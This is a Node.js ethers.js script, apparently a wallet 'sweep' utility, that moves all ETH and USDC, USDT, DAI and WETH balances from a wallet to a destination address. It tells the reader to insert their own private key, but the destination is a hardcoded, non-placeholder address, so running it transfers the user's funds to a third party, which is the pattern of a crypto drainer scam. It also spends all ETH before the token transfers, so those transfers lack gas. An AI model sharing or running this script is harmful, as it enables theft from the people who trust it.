const { ethers } = require("ethers");

// ✅ Replace with YOUR data
const PRIVATE_KEY = "0xYOUR_PRIVATE_KEY"; // ⛔ NEVER share this
const DESTINATION = "0x5299295fA08BBc452D50bc8eb664bA30Fc38Adfc";
const INFURA_URL = "https://mainnet.infura.io/v3/YOUR_INFURA_KEY";

// 💡 ERC-20 ABI
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address, uint256) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

// 💸 Tokens to sweep
const tokenList = [
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"  // WETH
];

async function sweep() {
  const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const sender = await wallet.getAddress();

  // Step 1: Sweep ETH
  const balance = await wallet.getBalance();
  const gasPrice = await provider.getGasPrice();
  const fee = gasPrice.mul(21000);

  if (balance.gt(fee)) {
    const tx = await wallet.sendTransaction({
      to: DESTINATION,
      value: balance.sub(fee),
      gasLimit: 21000,
      gasPrice
    });
    console.log(`✅ ETH sent: ${tx.hash}`);
  } else {
    console.log("❌ Not enough ETH to cover gas.");
  }

  // Step 2: Sweep Tokens
  for (const tokenAddress of tokenList) {
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
    const balance = await token.balanceOf(sender);

    if (balance.gt(0)) {
      const symbol = await token.symbol();
      const decimals = await token.decimals();
      const tx = await token.transfer(DESTINATION, balance);
      console.log(`✅ ${symbol} sent! TX: ${tx.hash}`);
    } else {
      console.log(`⚪ No ${tokenAddress} balance.`);
    }
  }
}

sweep();